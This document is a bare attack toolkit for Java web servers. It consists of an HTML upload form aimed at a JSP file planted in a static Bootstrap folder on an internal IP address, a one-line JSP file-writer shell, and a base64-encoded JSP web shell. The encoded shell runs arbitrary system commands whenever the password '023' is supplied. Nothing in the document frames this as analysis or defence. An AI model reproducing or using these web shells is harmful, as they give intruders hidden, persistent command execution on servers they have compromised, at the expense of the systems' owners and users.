<form action="http://10.124.110.66:8088/aml/static/bootstrap/3.3.5/userPhoto/1022.jsp?f=cmd.jsp&p=imgs" method="post">
<textarea name=t cols=120 rows=10 width=45>your code</textarea><BR><center><br>
<input type=submit value="提交">
</form>

-----------------------------------------
<% if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("p")+"/"+request.getParameter("f"))).write(new sun.misc.BASE64Decoder().decodeBuffer(java.net.URLDecoder.decode(request.getParameter("t"))));out.print("<br/>");out.print(application.getRealPath("/"));%>

------------
PCUKaWYoIjAyMyIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkpewpqYXZhLmlvLklucHV0U3RyZWFtIGluID1SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJpIikpLmdldElucHV0U3RyZWFtKCk7CQkJCQkKaW50IGEgPSAtMTsKYnl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTsKb3V0LnByaW50bG4oIi0tLS0tIik7Cm91dC5wcmludCgiICA8YnIvPiAgICIpOwoKd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsKCW91dC5wcmludChuZXcgU3RyaW5nKGIpKyIgPGJyLz4gIik7CiAgICAgICAgCn0Kb3V0LnByaW50bG4oIi0tLS0tLS0tLSIpOwoKCm91dC5wcmludCgiICAgPGJyLz4gICIpOwoKb3V0LnByaW50bG4oIm5vdyBleGVjIGNtZCEhISEiKTsKfQoKICAgICAgIAogIAoKIAoKICAJCSAJCQolPgo=
----------------
